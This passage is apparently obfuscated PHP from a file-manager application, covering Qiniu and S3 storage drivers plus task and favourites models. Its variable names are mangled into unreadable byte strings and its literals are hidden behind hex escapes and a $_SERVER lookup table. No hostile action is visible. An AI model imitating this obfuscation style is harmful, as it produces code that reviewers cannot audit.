$this->fileList($×Ô÷Áú, $°»şåé[8], !0); foreach ($¿£óœ¡¾[$°»şåé[82]] as $ÙšÔÃâŒ => $ÈàÎŠ…î) { $¿£óœ¡¾[$°»şåé[82]][$ÙšÔÃâŒ] = $this->folderInfo($ÈàÎŠ…î, $Ïı£•¼Ä); } foreach ($¿£óœ¡¾[$°»şåé[83]] as $ÙšÔÃâŒ => $ÈàÎŠ…î) { $¿£óœ¡¾[$°»şåé[83]][$ÙšÔÃâŒ] = $this->fileInfo($ÈàÎŠ…î[$°»şåé[94]], $Ïı£•¼Ä, $ÈàÎŠ…î); } return $¿£óœ¡¾; } public function has($­üËë¼–, $ÑÚ°í¤ = false, $‡”¸è¦Ş = true) { $ÎÚÛß‚ =& $_SERVER[ï»»·÷á]; $­üËë¼– = trim($­üËë¼–, $ÎÚÛß‚[8]); $İ–İá²ô = empty($­üËë¼–) && $­üËë¼– !== $ÎÚÛß‚[198] ? $ÎÚÛß‚[12] : $­üËë¼– . $ÎÚÛß‚[8]; $õÄ‰¬® = $ÎÚÛß‚[12]; $ú­†¢§ª = 500; $“Ÿ©¹ƒÂ = $ÎÚÛß‚[8]; $Ïé‹ºæ = $€úıÉ = 0; while (!0) { check_abort(); list($ùÅéÒÙ¨, $ËœÙ‰¤î) = $this->bucketManager->listFiles($this->bucket, $İ–İá²ô, $õÄ‰¬®, $ú­†¢§ª, $“Ÿ©¹ƒÂ); if ($ËœÙ‰¤î) { break; } $õÄ‰¬® = array_key_exists($ÎÚÛß‚[1418], $ùÅéÒÙ¨) ? $õÄ‰¬® = $ùÅéÒÙ¨[$ÎÚÛß‚[1451]] : $ÎÚÛß‚[12]; if ($ÑÚ°í¤) { if (!empty($ùÅéÒÙ¨[$ÎÚÛß‚[1452]])) { $Ïé‹ºæ += count($ùÅéÒÙ¨[$ÎÚÛß‚[1452]]); } if (!empty($ùÅéÒÙ¨[$ÎÚÛß‚[1453]])) { $€úıÉ += count($ùÅéÒÙ¨[$ÎÚÛß‚[1453]]); } if ($õÄ‰¬® === $ÎÚÛß‚[12]) { break; } continue; } if ($‡”¸è¦Ş) { if (!empty($ùÅéÒÙ¨[$ÎÚÛß‚[1452]])) { return !0; } } else { if (!empty($ùÅéÒÙ¨[$ÎÚÛß‚[1453]])) { return !0; } } if ($õÄ‰¬® === $ÎÚÛß‚[12]) { break; } } if ($ÑÚ°í¤) { return array($ÎÚÛß‚[207] => $Ïé‹ºæ, $ÎÚÛß‚[208] => $€úıÉ); } return !1; } public function listAll($’â¦¯®) { $§°ÏÒı =& $_SERVER[ï»»·÷á]; $™ÄìŒº­ = $this->fileList($’â¦¯®, $§°ÏÒı[12], !0); $Òºâ½³ñ = array_to_keyvalue($™ÄìŒº­[$§°ÏÒı[83]], $§°ÏÒı[32]); foreach ($™ÄìŒº­[$§°ÏÒı[82]] as $–½¡šõ½) { if (is_string($–½¡šõ½)) { $Òºâ½³ñ[$–½¡šõ½] = array($§°ÏÒı[76] => 0); } } return $this->listAllFiles($’â¦¯®, $Òºâ½³ñ); } private function fileList($½ÊŞ®€, $Ÿ…„š£› = '', $º†ï‘Æ° = 0) { $ïË¸«„¼ =& $_SERVER[ï»»·÷á]; $½ÊŞ®€ = trim($½ÊŞ®€, $ïË¸«„¼[8]); $¨Èıü„† = empty($½ÊŞ®€) && $½ÊŞ®€ !== $ïË¸«„¼[198] ? $ïË¸«„¼[12] : $½ÊŞ®€ . $ïË¸«„¼[8]; $ğ½ĞŸ–ù = $ïË¸«„¼[12]; $…•Õóö¯ = 1000; $œ¬†œ› = $°á¢³¥Ğ = array(); while (!0) { check_abort(); list($´×¨®Â¯, $ÈÔ¦Œ¹) = $this->bucketManager->listFiles($this->bucket, $¨Èıü„†, $ğ½ĞŸ–ù, $…•Õóö¯, $Ÿ…„š£›); if ($ÈÔ¦Œ¹) { break; } $ğ½ĞŸ–ù = array_key_exists($ïË¸«„¼[1418], $´×¨®Â¯) ? $ğ½ĞŸ–ù = $´×¨®Â¯[$ïË¸«„¼[1451]] : $ïË¸«„¼[12]; $ŞŸ¬ë…œ = isset($´×¨®Â¯[$ïË¸«„¼[1452]]) ? $´×¨®Â¯[$ïË¸«„¼[1452]] : array(); $ØúöğÍÑ = isset($´×¨®Â¯[$ïË¸«„¼[1453]]) ? $´×¨®Â¯[$ïË¸«„¼[1453]] : array(); foreach ($ŞŸ¬ë…œ as $òğÉòªÚ) { if ($òğÉòªÚ[$ïË¸«„¼[94]] == $¨Èıü„†) { continue; } $¾Ãñ¨÷¯ = $òğÉòªÚ[$ïË¸«„¼[94]]; $³õÑñ±÷ = $òğÉòªÚ[$ïË¸«„¼[1449]]; $òğÉòªÚ[$ïË¸«„¼[76]] = $³õÑñ±÷; $ªõÓ´‘­ = $³õÑñ±÷ == 0 && substr($¾Ãñ¨÷¯, strlen($¾Ãñ¨÷¯) - 1, 1) == $ïË¸«„¼[8] ? !0 : !1; $this->cacheMethodInfoSet($¾Ãñ¨÷¯, $ªõÓ´‘­, $òğÉòªÚ); if ($ªõÓ´‘­) { $œ¬†œ›[] = $¾Ãñ¨÷¯; continue; } $°á¢³¥Ğ[] = $º†ï‘Æ° ? $òğÉòªÚ : $¾Ãñ¨÷¯; } foreach ($ØúöğÍÑ as $¾Ãñ¨÷¯) { if ($¾Ãñ¨÷¯ == $¨Èıü„†) { continue; } $œ¬†œ›[] = $¾Ãñ¨÷¯; $this->cacheMethodInfoSet($¾Ãñ¨÷¯, !0); } if ($ğ½ĞŸ–ù === $ïË¸«„¼[12]) { break; } } $this->cacheMethodInfoSet($½ÊŞ®€, !0); return array($ïË¸«„¼[82] => $œ¬†œ›, $ïË¸«„¼[83] => $°á¢³¥Ğ); } public function canRead($¶Î¨ìõû) { return $this->exist($¶Î¨ìõû) ? !0 : !1; } public function canWrite($´Ì´È¯) { return $this->exist($´Ì´È¯) ? !0 : !1; } public function getContent($¥Ïê²û) { return $this->fileSubstr($¥Ïê²û, 0, -1); } public function setContent($îÖçíœ©, $À¤Ê™‘ì = '') { $ÅÕ–Œİ» = $this->tempFile($this->pathThis($îÖçíœ©)); file_put_contents($ÅÕ–Œİ», $À¤Ê™‘ì); if ($this->upload($îÖçíœ©, $ÅÕ–Œİ»)) { $this->tempFileRemve($ÅÕ–Œİ»); return !0; } return !1; } public function refreshUrls($³…¦­Õß) { $Ğ­¬¢€Ù =& $_SERVER[ï»»·÷á]; $¹ìşáÒŒ = array(); if (is_array($³…¦­Õß)) { foreach ($³…¦­Õß as $ÔªÒÊƒ) { $¹ìşáÒŒ[] = $this->link($ÔªÒÊƒ); } } else { $¹ìşáÒŒ[] = $this->link($³…¦­Õß); } $Ğã‹šı = new Qiniu\Cdn\CdnManager($this->auth); list($ğƒ·©§£, $ÈÒ‘–ÓÍ) = $Ğã‹šı->refreshUrls($¹ìşáÒŒ); if ($ÈÒ‘–ÓÍ) { return !1; } return $ğƒ·©§£[$Ğ­¬¢€Ù[1192]] == $Ğ­¬¢€Ù[772] ? !0 : !1; } public function fileSubstr($•—Ÿîƒş, $ò­èİœ®, $ŞÈ’ğ¤) { $¨™™º†å =& $_SERVER[ï»»·÷á]; if (!($€şÄÉõ = $this->link($•—Ÿîƒş))) { return !1; } $‚ıíûÊ = !1; if ($ŞÈ’ğ¤ > 0) { $Íàü®Ò¹ = $ò­èİœ® + $ŞÈ’ğ¤ - 1; $‚ıíûÊ = array($¨™™º†å[1454] . $ò­èİœ® . $¨™™º†å[386] . $Íàü®Ò¹); } $Úâ¸Ùî = url_request($€şÄÉõ, $¨™™º†å[230], !1, $‚ıíûÊ); return $Úâ¸Ùî[$¨™™º†å[762]] ? $Úâ¸Ùî[$¨™™º†å[1212]] : !1; } public function upload($Ø·ÚÂâî, $‘Î…¬„Õ, $ò­Á¢ç– = false, $úÛ­‚²· = REPEAT_REPLACE) { $Îóş……ˆ = new Qiniu\Storage\UploadManager(); $øñ¨À’ = $this->auth->uploadToken($this->bucket, $Ø·ÚÂâî); $ıéÊ¿ÊĞ = get_file_mime(get_path_ext($‘Î…¬„Õ)); list($‚¡öÁ ¡, $Ş¼ç÷ª) = $Îóş……ˆ->putFile($øñ¨À’, $Ø·ÚÂâî, $‘Î…¬„Õ, null, $ıéÊ¿ÊĞ); return $Ş¼ç÷ª ? !1 : $this->getPathOuter($Ø·ÚÂâî); } public function uploadFormData($²®Ñô²Ê, $º§‚¢ = 3600) { return $this->uploadToken($²®Ñô²Ê, $º§‚¢); } public function multiUploadFormData($†ÓŠØ£×, $ÇèÏó¹ = 3600) { return $this->uploadToken($†ÓŠØ£×, $ÇèÏó¹); } private function uploadToken($æ–ßÕó¼, $ÀæˆÀ×ƒ = 3600) { $çèÅµ”Š =& $_SERVER[ï»»·÷á]; $áÔ’Öä¾ = $ÀæˆÀ×ƒ; $ªû¥´®¨ = array($çèÅµ”Š[1455] => $çèÅµ”Š[1456]); $ËÖÊˆá = $æ–ßÕó¼; $ûûŒ¶¨ = $this->auth->uploadToken($this->bucket, $ËÖÊˆá, $áÔ’Öä¾, $ªû¥´®¨, !0); $àè×›‹ = empty($this->region) || $this->region == $çèÅµ”Š[1457] ? $çèÅµ”Š[12] : $çèÅµ”Š[386] . $this->region; $¾à¸óÊ² = http_type() . "\72\57\x2f\165\160\x6c\x6f\x61\x64{$àè×›‹}\x2e\161\x69\x6e\151\x75\160\x2e\x63\x6f\155\x2f"; return array($çèÅµ”Š[1458] => $ûûŒ¶¨, $çèÅµ”Š[1459] => $¾à¸óÊ²); } public function download($‹Á¼ˆã÷, $—Ìé¨¦É) { $Ç¦§ü¢Û = IO::getPathInner(IO::mkfile($—Ìé¨¦É)); if (!($Î³éæè‡ = $this->link($‹Á¼ˆã÷))) { return !1; } $±óæ†Ê— = 0; $Ì°¶½Óê = 1024 * 200; $½ÅÂÎÂ = fopen($Ç¦§ü¢Û, $_SERVER[ï»»·÷á][1460]); while (!0) { $êİ®øÄî = $this->fileSubstr($‹Á¼ˆã÷, $±óæ†Ê—, $Ì°¶½Óê); if ($êİ®øÄî === !1) { return !1; } fwrite($½ÅÂÎÂ, $êİ®øÄî); $±óæ†Ê— += $Ì°¶½Óê; if (strlen($êİ®øÄî) < $Ì°¶½Óê) { break; } } fclose($½ÅÂÎÂ); return $—Ìé¨¦É; } public function link($œ‹Ùòê¢, $ÜŸëôæµ = '') { if (!$this->isFile($œ‹Ùòê¢)) { return !1; } $Ëœúæ¼¯ = $this->getHost() . $_SERVER[ï»»·÷á][8] . $this->pathEncode($œ‹Ùòê¢) . $ÜŸëôæµ; return $this->auth->privateDownloadUrl($Ëœúæ¼¯, 3600 * 12); } public function fileOut($ÅëÚ´ô…, $Á€Âì—– = false, $Ö€ÄìŠ¯ = false, $û‡ü¢Œ = '') { $– ­«ä =& $_SERVER[ï»»·÷á]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÅëÚ´ô…, $Á€Âì—–, $Ö€ÄìŠ¯, $û‡ü¢Œ); } if (!$Ö€ÄìŠ¯) { $Ö€ÄìŠ¯ = $this->pathThis($ÅëÚ´ô…); } $­–Ö’Ùš = $Á€Âì—– ? $– ­«ä[1461] . rawurlencode($Ö€ÄìŠ¯) : $– ­«ä[12]; $Åõ‚òÃö = $this->link($ÅëÚ´ô…, $­–Ö’Ùš); $this->fileOutLink($Åõ‚òÃö); } public function fileOutServer($µÌ…œ, $¼Ú¾—£À = false, $»­ü¸àå = false, $äæ® = '') { parent::fileOut($µÌ…œ, $¼Ú¾—£À, $»­ü¸àå, $äæ®); } public function fileOutImage($Ï—¹£«È, $…­ßƒ = 250) { $â»ı‰­ò = $this->link($Ï—¹£«È, $_SERVER[ï»»·÷á][1462] . $…­ßƒ); $this->fileOutLink($â»ı‰­ò); } public function fileOutImageServer($¥—¡ØÙ–, $É·–ÊÛ¤ = 250) { parent::fileOutImage($¥—¡ØÙ–, $É·–ÊÛ¤); } public function hashMd5($Ê›»¦²) { $æ…—Ó“ =& $_SERVER[ï»»·÷á]; $Ÿš£ì’Â = $this->objectMeta($Ê›»¦²); return isset($Ÿš£ì’Â[$æ…—Ó“[212]]) ? $Ÿš£ì’Â[$æ…—Ó“[212]] : !1; $¡Õ˜Õ”Ø = $this->link($Ê›»¦², $æ…—Ó“[1463]); } public function size($ÏÓ—×½) { $öĞÒŞŒË = $this->objectMeta($ÏÓ—×½); return $öĞÒŞŒË ? $öĞÒŞŒË[$_SERVER[ï»»·÷á][76]] : 0; } public function info($Ü®Éé¯Œ) { if ($this->isFolder($Ü®Éé¯Œ)) { return $this->folderInfo($Ü®Éé¯Œ); } else { if ($this->isFile($Ü®Éé¯Œ)) { return $this->fileInfo($Ü®Éé¯Œ); } } return !1; } public function exist($ÚèûõÍ) { return $this->isFile($ÚèûõÍ) || $this->isFolder($ÚèûõÍ); } public function isFile($éÈİìÂğ) { return !$this->isFolder($éÈİìÂğ) && $this->objectMeta($éÈİìÂğ); } public function isFolder($ã—¤·‡) { return $this->cacheMethod($_SERVER[ï»»·÷á][165], $ã—¤·‡); } protected function objectMeta($ñÌ„¸è) { return $this->cacheMethod($_SERVER[ï»»·÷á][167], $ñÌ„¸è); } protected function _objectMeta($×Õ’Á¢Ÿ) { $Á÷ı·ê• =& $_SERVER[ï»»·÷á]; list($àğË€Ç, $†Ô•¿‰«) = $this->bucketManager->stat($this->bucket, $×Õ’Á¢Ÿ); if ($àğË€Ç) { $àğË€Ç[$Á÷ı·ê•[76]] = intval($àğË€Ç[$Á÷ı·ê•[1449]]); } return $àğË€Ç; } protected function _isFolder($„ªÇ”Å¢) { $Á¶ùİóÓ =& $_SERVER[ï»»·÷á]; if ($„ªÇ”Å¢ == $Á¶ùİóÓ[12] || $„ªÇ”Å¢ == $Á¶ùİóÓ[8]) { return !0; } list($ôåİİ¥Ğ, $îñ½ ¤±) = $this->bucketManager->listFiles($this->bucket, trim($„ªÇ”Å¢, $Á¶ùİóÓ[8]) . $Á¶ùİóÓ[8], $Á¶ùİóÓ[12], 1, $Á¶ùİóÓ[8]); return !empty($ôåİİ¥Ğ[$Á¶ùİóÓ[1452]]) || !empty($ôåİİ¥Ğ[$Á¶ùİóÓ[1453]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($ß…Ø¹ğä) { parent::__construct($ß…Ø¹ğä); } public function uploadFormData($àŞ˜ì†…, $ˆ³òãÎ = 3600) { $ñ—æ¬¹ò =& $_SERVER[ï»»·÷á]; $ïşíÀæ = $ñ—æ¬¹ò[199]; $…Çˆ»ËØ = $ñ—æ¬¹ò[1368]; $ıÆ˜¤¤ = $ñ—æ¬¹ò[62]; $öøÌºúë = gmdate($ñ—æ¬¹ò[1369]); $ÌæÌ¡ˆÛ = gmdate($ñ—æ¬¹ò[763]); $§˜ş‹‡— = $ñ—æ¬¹ò[1370]; $‹šâòë¡ = $ˆ³òãÎ . $ñ—æ¬¹ò[12]; $”†·ıÜŠ = $ñ—æ¬¹ò[1332]; $Õ˜Ö¯ß = array($this->accessKey, $ÌæÌ¡ˆÛ, $this->region, $ıÆ˜¤¤, $§˜ş‹‡—); $÷Ï’–Ô” = implode($ñ—æ¬¹ò[8], $Õ˜Ö¯ß); $ÕöÈªÊ‹ = array($ñ—æ¬¹ò[1334] => gmdate($ñ—æ¬¹ò[1333], strtotime($ñ—æ¬¹ò[1371])), $ñ—æ¬¹ò[1335] => array(array($ñ—æ¬¹ò[1337] => $this->bucket), array($ñ—æ¬¹ò[1336] => $ïşíÀæ), array($ñ—æ¬¹ò[1338], $ñ—æ¬¹ò[1339], $ñ—æ¬¹ò[12]), array($ñ—æ¬¹ò[1338], $ñ—æ¬¹ò[1372], $ñ—æ¬¹ò[12]), array($ñ—æ¬¹ò[1338], $ñ—æ¬¹ò[1373], $ñ—æ¬¹ò[12]), array($ñ—æ¬¹ò[1340] => $”†·ıÜŠ), array($ñ—æ¬¹ò[1374] => $÷Ï’–Ô”), array($ñ—æ¬¹ò[1375] => $…Çˆ»ËØ), array($ñ—æ¬¹ò[1376] => $öøÌºúë), array($ñ—æ¬¹ò[1377] => $‹šâòë¡))); $Ô¥äÍ Ê = base64_encode(json_encode($ÕöÈªÊ‹)); $òÏª–¶ = hash_hmac($ñ—æ¬¹ò[1378], $ÌæÌ¡ˆÛ, $ñ—æ¬¹ò[1379] . $this->secret, !0); $®¹ÙÚ²— = hash_hmac($ñ—æ¬¹ò[1378], $this->region, $òÏª–¶, !0); $Â ŠöıË = hash_hmac($ñ—æ¬¹ò[1378], $ıÆ˜¤¤, $®¹ÙÚ²—, !0); $ÁŞŠìª° = hash_hmac($ñ—æ¬¹ò[1378], $§˜ş‹‡—, $Â ŠöıË, !0); $Ã·õøâš = hash_hmac($ñ—æ¬¹ò[1378], $Ô¥äÍ Ê, $ÁŞŠìª°); $‡¾àíÄ = array($ñ—æ¬¹ò[215] => $ñ—æ¬¹ò[12], $ñ—æ¬¹ò[1380] => $ñ—æ¬¹ò[12], $ñ—æ¬¹ò[1336] => $ïşíÀæ, $ñ—æ¬¹ò[1340] => $”†·ıÜŠ, $ñ—æ¬¹ò[1344] => $Ô¥äÍ Ê, $ñ—æ¬¹ò[1381] => $÷Ï’–Ô”, $ñ—æ¬¹ò[1382] => $…Çˆ»ËØ, $ñ—æ¬¹ò[1383] => $öøÌºúë, $ñ—æ¬¹ò[1384] => $‹šâòë¡, $ñ—æ¬¹ò[1385] => $Ã·õøâš, $ñ—æ¬¹ò[182] => $this->getHost()); return $‡¾àíÄ; } public function multiUploadFormData($ÈúÈõì, $¡¤ÎÒâ = 3600) { $ª©¡°ı€ =& $_SERVER[ï»»·÷á]; $ÉÁªƒ•Û = gmdate($ª©¡°ı€[1464]); $¾‹ ”¤ = array(); $İŞ•”¶Ë = $this->client->getUploadId($this->bucket, $ÈúÈõì, $¾‹ ”¤); if (!$İŞ•”¶Ë) { return !1; } return array($ª©¡°ı€[223] => $İŞ•”¶Ë, $ª©¡°ı€[182] => $this->getHost() . $ª©¡°ı€[8] . $this->pathEncode($ÈúÈõì), $ª©¡°ı€[224] => $ÉÁªƒ•Û, $ª©¡°ı€[94] => $ÈúÈõì); } public function multiUploadAuthData($½Ç¤µ¹Ó, $Ïòı³şÎ = array()) { $´˜ùé†Æ =& $_SERVER[ï»»·÷á]; $£ÚŞ‹Ûº = isset($Ïòı³şÎ[$´˜ùé†Æ[174]]) ? $Ïòı³şÎ[$´˜ùé†Æ[174]] : $´˜ùé†Æ[12]; $Ù³œ‹êş = $Ïòı³şÎ[$´˜ùé†Æ[94]]; unset($Ïòı³şÎ[$´˜ùé†Æ[94]]); if (isset($Ïòı³şÎ[$´˜ùé†Æ[225]])) { return $this->listUploadParts($Ù³œ‹êş, $Ïòı³şÎ); } $Ú¶‹Û­ = array(); if (isset($Ïòı³şÎ[$´˜ùé†Æ[1465]])) { $Ú¶‹Û­[$´˜ùé†Æ[1466]] = $Ïòı³şÎ[$´˜ùé†Æ[1465]]; } $¨Ëì¢×¨ = explode($´˜ùé†Æ[184], $this->getHost()); $¨ÈƒŒ£È = array($´˜ùé†Æ[1467] => $¨Ëì¢×¨[1], $´˜ùé†Æ[1468] => $´˜ùé†Æ[12], $´˜ùé†Æ[215] => $´˜ùé†Æ[120], $´˜ùé†Æ[1380] => $Ïòı³şÎ[$´˜ùé†Æ[76]]); $ñˆõ­¬¯ = $´˜ùé†Æ[228]; $Ã¼õû±Ù = $´˜ùé†Æ[8] . $this->pathEncode($Ù³œ‹êş) . $£ÚŞ‹Ûº; $õĞãÆ = $this->client->__getSignatureV4($Ú¶‹Û­, $¨ÈƒŒ£È, $ñˆõ­¬¯, $Ã¼õû±Ù); if (strpos($£ÚŞ‹Ûº, $´˜ùé†Æ[227]) === 0) { if (isset($Ú¶‹Û­[$´˜ùé†Æ[1466]])) { $ö©á€²Í = $Ú¶‹Û­[$´˜ùé†Æ[1466]]; } else { if (isset($õĞãÆ[$´˜ùé†Æ[1466]])) { $ö©á€²Í = $õĞãÆ[$´˜ùé†Æ[1466]]; } else { $ö©á€²Í = hash($´˜ùé†Æ[1378], $´˜ùé†Æ[12]); } } return array($´˜ùé†Æ[234] => $õĞãÆ[$´˜ùé†Æ[234]], $´˜ùé†Æ[1466] => $ö©á€²Í, $´˜ùé†Æ[224] => $õĞãÆ[$´˜ùé†Æ[1469]]); } return $õĞãÆ[$´˜ùé†Æ[234]]; } public function listUploadParts($ƒÚéæß, $–à©°ñ = array()) { $©¶ï¿Ûƒ =& $_SERVER[ï»»·÷á]; $óèò„ĞË = str_replace($©¶ï¿Ûƒ[235], $©¶ï¿Ûƒ[12], $–à©°ñ[$©¶ï¿Ûƒ[174]]); $Ê à¥×• = $this->client->listParts($this->bucket, $ƒÚéæß, $óèò„ĞË); if (!$Ê à¥×•) { return !1; } $”ò‚œ¤š = $©¶ï¿Ûƒ[1470]; foreach ($Ê à¥×• as $Ûì¡ƒÃ) { $”ò‚œ¤š .= $©¶ï¿Ûƒ[1471] . "\x3c\120\x61\162\x74\116\x75\x6d\x62\145\162\x3e{$Ûì¡ƒÃ[$©¶ï¿Ûƒ[1425]]}\x3c\x2f\120\x61\162\164\116\165\155\x62\x65\162\x3e\xa" . "\74\x45\x54\141\147\76{$Ûì¡ƒÃ[$©¶ï¿Ûƒ[1426]]}\x3c\x2f\x45\x54\x61\x67\76\xa" . $©¶ï¿Ûƒ[1472]; } $”ò‚œ¤š .= $©¶ï¿Ûƒ[1473]; $†µ¶ØåÖ = array(); $Ñ¢Å«°­ = explode($©¶ï¿Ûƒ[184], $this->getHost()); $¬úÕÃ´ñ = array($©¶ï¿Ûƒ[1467] => $Ñ¢Å«°­[1], $©¶ï¿Ûƒ[215] => $©¶ï¿Ûƒ[120], $©¶ï¿Ûƒ[1380] => strlen($”ò‚œ¤š)); $¦àÔäÅã = $©¶ï¿Ûƒ[226]; $©Á„ÅÁÊ = $©¶ï¿Ûƒ[8] . $this->pathEncode($ƒÚéæß) . $–à©°ñ[$©¶ï¿Ûƒ[174]]; $—Åî¯Á = $this->client->__getSignatureV4($†µ¶ØåÖ, $¬úÕÃ´ñ, $¦àÔäÅã, $©Á„ÅÁÊ, $”ò‚œ¤š); return array($©¶ï¿Ûƒ[234] => $—Åî¯Á[$©¶ï¿Ûƒ[234]], $©¶ï¿Ûƒ[224] => $—Åî¯Á[$©¶ï¿Ûƒ[1469]], $©¶ï¿Ûƒ[236] => $Ê à¥×•, $©¶ï¿Ûƒ[1466] => $—Åî¯Á[$©¶ï¿Ûƒ[1466]]); } public function link($’ìş’š², $²°Øæ¶ç = array()) { return parent::link($’ìş’š², $²°Øæ¶ç); } public function fileOut($ÒËú˜£ñ, $ˆ³½ãÅã = false, $êçµ®ù = false, $ş¤·¬Ğ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ï»»·÷á][1474])) { return parent::fileOutServer($ÒËú˜£ñ, $ˆ³½ãÅã, $êçµ®ù, $ş¤·¬Ğ); } parent::fileOut($ÒËú˜£ñ, $ˆ³½ãÅã, $êçµ®ù, $ş¤·¬Ğ); } public function fileOutImage($–ùŸùõÆ, $ÛĞëîàë = 250) { if (strstr($this->endpoint, $_SERVER[ï»»·÷á][1474])) { return parent::fileOutImageServer($–ùŸùõÆ, $ÛĞëîàë); } parent::fileOutImage($–ùŸùõÆ, $ÛĞëîàë); } public function fileOutLink($Í²ô¤ú°) { $ÒúıÂƒ÷ =& $_SERVER[ï»»·÷á]; if (substr($Í²ô¤ú°, 0, 7) == $ÒúıÂƒ÷[1347]) { $Í²ô¤ú° = $ÒúıÂƒ÷[1348] . substr($Í²ô¤ú°, 7); } header($ÒúıÂƒ÷[161] . $Í²ô¤ú°); die; } public function getHost() { $ƒ„áº¢È =& $_SERVER[ï»»·÷á]; $ÃÀæÂœ = str_rtrim(parent::getHost(), $ƒ„áº¢È[8] . $this->bucket); $ÃÀæÂœ = explode($ƒ„áº¢È[184], $ÃÀæÂœ); return $ÃÀæÂœ[0] . $ƒ„áº¢È[184] . $this->bucket . $ƒ„áº¢È[10] . $ÃÀæÂœ[1]; } } goto A˜¢ó½‚Å¬; a´¾¹Œ ›º: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\x2e\x74\141\x73\153\114\151\163\x74"; public $field = array("\x6e\141\155\145", "\x74\x79\x70\145", "\145\166\x65\156\164", "\164\x69\155\x65", "\x64\145\163\x63", "\163\171\x73\x74\x65\x6d", "\145\156\x61\142\x6c\145", "\x6c\141\163\164\122\x75\156", "\x73\x6f\x72\164"); public function listData($Óš÷òÇÏ = false, $‘ñöÖá‚ = "\x73\x6f\162\x74", $Şìœ÷¯ñ = false) { return parent::listData($Óš÷òÇÏ, $‘ñöÖá‚, $Şìœ÷¯ñ); } public function add($‰Éâ¼ºÎ) { $Ôê¹Ëãı =& $_SERVER[ï»»·÷á]; $°Ğ¹¤¡ = $this->findByName($‰Éâ¼ºÎ[$Ôê¹Ëãı[32]]); if ($°Ğ¹¤¡) { return !1; } $‰Éâ¼ºÎ[$Ôê¹Ëãı[1638]] = 0; $‰Éâ¼ºÎ[$Ôê¹Ëãı[1891]] = $this->getSort(); return parent::insert($‰Éâ¼ºÎ); } private function getSort() { $âÌ œ´ =& $_SERVER[ï»»·÷á]; $öøÌ–Ê¤ = parent::listData(); $ã×Á¢æª = array_to_keyvalue($öøÌ–Ê¤, $âÌ œ´[12], $âÌ œ´[1891]); return empty($ã×Á¢æª) ? 0 : max($ã×Á¢æª) + 1; } public function update($ƒ˜…•¾±, $Íˆ›»–ß) { $Ä«Ã×Ğ™ =& $_SERVER[ï»»·÷á]; $ıËè¼Ë = $this->listData($ƒ˜…•¾±); $¹ÚÊ³òÓ = $this->findByName($Íˆ›»–ß[$Ä«Ã×Ğ™[32]]); if (!$ıËè¼Ë || $¹ÚÊ³òÓ && $¹ÚÊ³òÓ[$Ä«Ã×Ğ™[399]] != $ıËè¼Ë[$Ä«Ã×Ğ™[399]]) { return !1; } return parent::update($ƒ˜…•¾±, $Íˆ›»–ß); } public function remove($µßÔ´°Ê, $ÇèÁ‘Íï = false) { $æÏ²’î =& $_SERVER[ï»»·÷á]; $ïÉ”ß› = $this->listData($µßÔ´°Ê); if (!$ïÉ”ß›) { return; } if (!$ÇèÁ‘Íï && $ïÉ”ß›[$æÏ²’î[1294]] == $æÏ²’î[88]) { return !1; } return parent::remove($µßÔ´°Ê); } public function enable($ô„—å², $ô”á¦õâ) { return $this->update($ô„—å², array($_SERVER[ï»»·÷á][2299] => $ô”á¦õâ)); } public function run($ˆ©—‡Æ) { return $this->update($ˆ©—‡Æ, array($_SERVER[ï»»·÷á][2311] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\163\x65\162\137\146\141\x76"; protected function cacheFunctionAlias($é©Ïò¬À) { $ã«½§Äç =& $_SERVER[ï»»·÷á]; return array($ã«½§Äç[1978] => array(USER_ID, $ã«½§Äç[2312])); } protected function listData() { $Èû½ÒÖ£ =& $_SERVER[ï»»·÷á]; $Ö˜•ô´ = array($Èû½ÒÖ£[1669] => USER_ID, $Èû½ÒÖ£[492] => 0); $áëˆÜãÅ = $Èû½ÒÖ£[2313]; $©˜Œô—ä = $this->field($áëˆÜãÅ)->where($Ö˜•ô´)->order($Èû½ÒÖ£[2314])->select(); return $©˜Œô—ä ? $©˜Œô—ä : array(); } protected function resetCache() { } protected function listView() { $ÕÚÖºäñ =& $_SERVER[ï»»·÷á]; $ˆ×ı¹‰ = $this->listData(); $ê¬ñö®î = array_filter_by_field($ˆ×ı¹‰, $ÕÚÖºäñ[33], $ÕÚÖºäñ[425]); $Ç®›‹È = array_to_keyvalue($ê¬ñö®î, $ÕÚÖºäñ[12], $ÕÚÖºäñ[84]); if (!$Ç®›‹È) { return $ˆ×ı¹‰; } $Ôñ‚³ó¹ = 2000; $¡ÓØ¿úû = array($ÕÚÖºäñ[426] => array($ÕÚÖºäñ[427], $Ç®›‹È)); $¸Ù´¿Ş = Model($ÕÚÖºäñ[838])->listSource($¡ÓØ¿úû, $Ôñ‚³ó¹); $¸Ù´¿Ş = array_merge($¸Ù´¿Ş[$ÕÚÖºäñ[83]], $¸Ù´¿Ş[$ÕÚÖºäñ[82]]); $¸Ù´¿Ş = array_to_keyvalue($¸Ù´¿Ş, $ÕÚÖºäñ[411]); foreach ($ˆ×ı¹‰ as $ì™ø¤ÆÚ => $†ëÓØÎî) { $¸ÂŠîìû = $¸Ù´¿Ş[$†ëÓØÎî[$ÕÚÖºäñ[84]]]; $¸ÂŠîìû = $¸ÂŠîìû ? $¸ÂŠîìû : array(); $ˆ×ı¹‰[$ì™ø¤ÆÚ] = array_merge($¸ÂŠîìû, $†ëÓØÎî); } return $ˆ×ı¹‰; } protected function addFav($±’ØèˆÀ, $±ûõ” = '', $¬ÎÁ¬Å¶ = "\163\157\165\x72\143\145") { $ôø÷¾ü“ =& $_SERVER[ï»»·÷á]; $ªıùİâ² = array($ôø÷¾ü“[1669] => USER_ID, $ôø÷¾ü“[492] => 0, $ôø÷¾ü“[431] => $¬ÎÁ¬Å¶, $ôø÷¾ü“[430] => $±’ØèˆÀ); if ($this->where($ªıùİâ²)->find()) { return !1; } $ªıùİâ² = array($ôø÷¾ü“[1669] => USER_ID, $ôø÷¾ü“[492] => 0); $£ÏĞÙƒ… = $this->where($ªıùİâ²)->max($ôø÷¾ü“[1891]); if (!$£ÏĞÙƒ…) { $£ÏĞÙƒ… = 0; } if (!$±ûõ” && $¬ÎÁ¬Å¶ == $ôø÷¾ü“[425]) { $•Êë·Ö© = Model($ôø÷¾ü“[1349])->where(array($ôø÷¾ü“[426] => $±’ØèˆÀ))->find(); if (!$•Êë·Ö©) { return !1; } $±ûõ” = 